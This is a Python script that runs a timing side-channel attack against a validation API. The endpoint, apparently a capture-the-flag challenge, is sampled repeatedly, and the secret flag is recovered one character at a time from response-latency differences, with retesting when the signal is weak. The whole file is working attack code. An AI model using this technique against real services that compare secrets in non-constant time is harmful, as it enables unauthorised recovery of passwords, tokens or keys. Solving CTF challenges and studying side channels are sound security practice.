import requests
import string
import time
import statistics

URL = "https://sofia-challenge.vercel.app/api/validate"

CHARSET = string.ascii_uppercase + string.digits + "_{}"
INITIAL_ATTEMPTS = 10     # More initial samples
RETEST_ATTEMPTS = 20      # Even more for retesting
MIN_DIFF_MS = 60          # Minimum 60ms difference to trust (adjusted for 100ms delay)

recovered = ""

print("[*] Starting hybrid timing attack...\n")
print(f"[*] Server delay: 100ms per correct character")
print(f"[*] Minimum difference threshold: {MIN_DIFF_MS}ms\n")

def test_character(guess, attempts):
    """Test a guess multiple times and return statistics"""
    times = []
    for _ in range(attempts):
        start = time.perf_counter()
        try:
            r = requests.post(URL, json={"flag": guess}, timeout=10)
        except requests.exceptions.RequestException:
            continue
        times.append(time.perf_counter() - start)
    
    if not times:
        return None, None
    
    return statistics.median(times), statistics.stdev(times) if len(times) > 1 else 0

def check_flag_status(flag):
    """Check the status of current flag"""
    try:
        r = requests.post(URL, json={"flag": flag}, timeout=10)
        data = r.json()
        return data.get("status")
    except Exception:
        return None

while True:
    print(f"{'='*70}")
    print(f"Current: '{recovered}' (length: {len(recovered)})")
    print(f"{'='*70}\n")
    
    # Phase 1: Screen all characters
    print(f"[Phase 1] Testing all {len(CHARSET)} characters ({INITIAL_ATTEMPTS} attempts each)...\n")
    
    timings = {}
    for i, ch in enumerate(CHARSET, 1):
        guess = recovered + ch
        median, stdev = test_character(guess, INITIAL_ATTEMPTS)
        
        if median is None:
            continue
            
        timings[ch] = median
        
        # Progress indicator
        if i % 10 == 0:
            print(f"  Progress: {i}/{len(CHARSET)} tested...")
    
    if not timings:
        print("\n[!] No successful requests — stopping.")
        break
    
    # Sort by timing
    sorted_chars = sorted(timings.items(), key=lambda x: x[1], reverse=True)
    
    print(f"\n[Top 5 Candidates by Timing]")
    for i, (ch, t) in enumerate(sorted_chars[:5], 1):
        diff = (t - sorted_chars[1][1]) * 1000 if i == 1 else (t - sorted_chars[0][1]) * 1000
        print(f"  {i}. '{ch}' -> {t:.4f}s (diff: {abs(diff):+.1f}ms)")
    
    best_char, best_time = sorted_chars[0]
    second_char, second_time = sorted_chars[1]
    time_diff_ms = (best_time - second_time) * 1000
    
    print(f"\nGap between #1 and #2: {time_diff_ms:.1f}ms")
    
    # Phase 2: Smart decision making
    if time_diff_ms < MIN_DIFF_MS:
        print(f"\n[⚠️] Gap < {MIN_DIFF_MS}ms — Retesting top 3 with {RETEST_ATTEMPTS} samples...\n")
        
        retest_results = {}
        for ch, _ in sorted_chars[:3]:
            guess = recovered + ch
            median, stdev = test_character(guess, RETEST_ATTEMPTS)
            retest_results[ch] = median
            print(f"  '{ch}': {median:.4f}s (stdev: {stdev:.4f}s)")
        
        # Re-evaluate
        sorted_retest = sorted(retest_results.items(), key=lambda x: x[1], reverse=True)
        best_char = sorted_retest[0][0]
        best_time = sorted_retest[0][1]
        second_time = sorted_retest[1][1]
        time_diff_ms = (best_time - second_time) * 1000
        
        print(f"\n[Retest Winner] '{best_char}' with {time_diff_ms:.1f}ms advantage")
        
        if time_diff_ms < 40:
            print(f"[⚠️] Still weak signal — proceeding with best guess")
    else:
        print(f"[✓] Strong signal — confident in '{best_char}'")
    
    # Add character
    recovered += best_char
    print(f"\n[+] Added '{best_char}'\n")
    
    # Verify status
    status = check_flag_status(recovered)
    
    if status == "success":
        print(f"{'='*70}")
        print(f"🎉 COMPLETE FLAG: {recovered}")
        print(f"{'='*70}")
        break
    elif status == "partial":
        print(f"[✓] Correct so far, continuing...\n")
    elif status == "error":
        print(f"[?] Server says error, but continuing...\n")
    
    # Safety limit
    if len(recovered) > 30:
        print("\n[!] Exceeded max length, stopping.")
        break

print(f"\n[Final] {recovered}")